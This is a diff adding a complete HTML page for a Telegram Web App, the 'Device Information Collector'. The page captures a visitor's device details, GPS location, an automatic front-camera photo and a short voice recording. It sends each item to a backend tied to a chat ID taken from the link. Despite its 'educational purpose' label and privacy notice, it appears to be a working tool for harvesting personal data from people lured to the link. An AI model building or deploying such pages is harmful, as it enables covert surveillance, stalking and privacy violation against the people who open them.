@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="theme-color" content="#0088cc">
+    <title>Device Info Bot - Telegram Web App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #4CAF50;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-bottom: 16px;
+        }
+
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .btn {
+            padding: 14px 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: #f0f0f0;
+            color: #333;
+        }
+
+        .btn-primary {
+            background: #0088cc;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #006699;
+            transform: translateY(-2px);
+        }
+
+        .btn-danger {
+            background: #ff4444;
+            color: white;
+        }
+
+        .btn-success {
+            background: #4CAF50;
+            color: white;
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .status-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 20px;
+            border-left: 4px solid #0088cc;
+        }
+
+        .status-text {
+            color: #666;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .video-container {
+            position: relative;
+            margin-top: 20px;
+            display: none;
+        }
+
+        video {
+            width: 100%;
+            border-radius: 12px;
+            background: #000;
+        }
+
+        .permission-warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 20px;
+            color: #856404;
+            font-size: 13px;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .button-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .card {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <span class="badge">📱 Telegram Web App</span>
+                <h1>Device Information Collector</h1>
+                <p>Educational purpose only • All data with your permission</p>
+            </div>
+
+            <div class="button-grid">
+                <button class="btn btn-primary" onclick="getDeviceInfo()">
+                    📱 Device Info
+                </button>
+                <button class="btn btn-primary" onclick="getLocation()">
+                    📍 Location
+                </button>
+                <button class="btn btn-primary" onclick="getBatteryInfo()">
+                    🔋 Battery
+                </button>
+                <button class="btn btn-primary" onclick="startCamera()">
+                    📸 Take Photo
+                </button>
+                <button class="btn btn-primary" onclick="startRecording()">
+                    🎙️ Record Voice
+                </button>
+                <button class="btn btn-success" onclick="sendAllData()">
+                    📤 Send All Data
+                </button>
+            </div>
+
+            <div class="status-box">
+                <strong>📊 Status:</strong>
+                <div id="status" class="status-text">Ready. Click any button above...</div>
+            </div>
+
+            <div id="videoContainer" class="video-container">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas" style="display:none"></canvas>
+            </div>
+
+            <div class="permission-warning">
+                ⚠️ <strong>Privacy Notice:</strong> Your browser will ask for permissions before accessing camera, microphone, or location. No data is stored permanently.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        class DeviceInfoCollector {
+            constructor() {
+                this.collectedData = {};
+                this.mediaRecorder = null;
+                this.audioChunks = [];
+                this.currentStream = null;
+                this.chatId = null;
+                
+                this.init();
+            }
+
+            init() {
+                // Get chat ID from URL
+                const urlParams = new URLSearchParams(window.location.search);
+                this.chatId = urlParams.get('start');
+                
+                if (!this.chatId) {
+                    this.updateStatus('⚠️ Chat ID not found. Please launch from Telegram bot.', 'error');
+                } else {
+                    this.updateStatus('✅ Ready! Click buttons to collect device information.', 'success');
+                }
+            }
+
+            updateStatus(message, type = 'info') {
+                const statusDiv = document.getElementById('status');
+                statusDiv.innerHTML = message;
+                statusDiv.style.color = type === 'error' ? '#dc3545' : type === 'success' ? '#28a745' : '#666';
+            }
+
+            async sendToBot(type, data) {
+                if (!this.chatId) {
+                    this.updateStatus('❌ No chat ID found', 'error');
+                    return false;
+                }
+
+                try {
+                    const response = await fetch('/api/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chatId: this.chatId,
+                            type: type,
+                            data: data
+                        })
+                    });
+
+                    const result = await response.json();
+                    if (result.success) {
+                        this.updateStatus(`✅ ${type} sent successfully!`, 'success');
+                        return true;
+                    }
+                } catch (error) {
+                    console.error('Error sending to bot:', error);
+                    this.updateStatus(`❌ Failed to send ${type}`, 'error');
+                }
+                return false;
+            }
+
+            async getDeviceInfo() {
+                this.updateStatus('📱 Collecting device information...');
+                
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    screenColorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    online: navigator.onLine,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                    deviceMemory: navigator.deviceMemory || 'N/A'
+                };
+
+                this.collectedData.device = deviceInfo;
+                await this.sendToBot('device', deviceInfo);
+            }
+
+            async getLocation() {
+                this.updateStatus('📍 Requesting location permission...');
+                
+                if (!('geolocation' in navigator)) {
+                    this.updateStatus('❌ Geolocation not supported', 'error');
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const location = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        
+                        this.collectedData.location = location;
+                        await this.sendToBot('location', location);
+                    },
+                    (error) => {
+                        let message = '❌ Location error: ';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                message += 'Permission denied';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                message += 'Position unavailable';
+                                break;
+                            case error.TIMEOUT:
+                                message += 'Request timeout';
+                                break;
+                            default:
+                                message += error.message;
+                        }
+                        this.updateStatus(message, 'error');
+                    }
+                );
+            }
+
+            async getBatteryInfo() {
+                this.updateStatus('🔋 Checking battery status...');
+                
+                if (!('getBattery' in navigator)) {
+                    this.updateStatus('❌ Battery API not supported in this browser', 'error');
+                    return;
+                }
+
+                try {
+                    const battery = await navigator.getBattery();
+                    const batteryInfo = {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                    
+                    this.collectedData.battery = batteryInfo;
+                    await this.sendToBot('battery', batteryInfo);
+                } catch (error) {
+                    this.updateStatus('❌ Failed to get battery info', 'error');
+                }
+            }
+
+            async startCamera() {
+                this.updateStatus('📸 Requesting camera permission...');
+                
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' }
+                    });
+                    
+                    const video = document.getElementById('video');
+                    const container = document.getElementById('videoContainer');
+                    
+                    video.srcObject = stream;
+                    this.currentStream = stream;
+                    container.style.display = 'block';
+                    
+                    this.updateStatus('📸 Camera ready. Taking photo in 2 seconds...');
+                    
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                        this.collectedData.photo = photoData;
+                        
+                        await this.sendToBot('photo', photoData);
+                        
+                        // Stop camera stream
+                        stream.getTracks().forEach(track => track.stop());
+                        container.style.display = 'none';
+                        this.updateStatus('✅ Photo captured and sent!', 'success');
+                    }, 2000);
+                } catch (error) {
+                    this.updateStatus('❌ Camera access denied or error', 'error');
+                    console.error('Camera error:', error);
+                }
+            }
+
+            async startRecording() {
+                this.updateStatus('🎙️ Requesting microphone permission...');
+                
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    this.mediaRecorder = new MediaRecorder(stream);
+                    this.audioChunks = [];
+                    
+                    this.mediaRecorder.ondataavailable = (event) => {
+                        this.audioChunks.push(event.data);
+                    };
+                    
+                    this.mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        
+                        reader.onloadend = async () => {
+                            const audioData = reader.result;
+                            this.collectedData.voice = audioData;
+                            await this.sendToBot('voice', audioData);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            this.updateStatus('✅ Voice recorded and sent!', 'success');
+                        };
+                        
+                        reader.readAsDataURL(audioBlob);
+                    };
+                    
+                    this.mediaRecorder.start();
+                    this.updateStatus('🎙️ Recording... 5 seconds');
+                    
+                    setTimeout(() => {
+                        if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
+                            this.mediaRecorder.stop();
+                        }
+                    }, 5000);
+                } catch (error) {
+                    this.updateStatus('❌ Microphone access denied or error', 'error');
+                    console.error('Microphone error:', error);
+                }
+            }
+
+            async sendAllData() {
+                this.updateStatus('📤 Sending all collected data...');
+                
+                let successCount = 0;
+                let totalCount = 0;
+                
+                for (const [key, value] of Object.entries(this.collectedData)) {
+                    totalCount++;
+                    if (await this.sendToBot(key, value)) {
+                        successCount++;
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 500)); // Rate limiting
+                }
+                
+                this.updateStatus(`✅ Sent ${successCount}/${totalCount} items successfully!`, 'success');
+            }
+        }
+
+        // Initialize the collector
+        const collector = new DeviceInfoCollector();
+    </script>
+</body>
+</html>
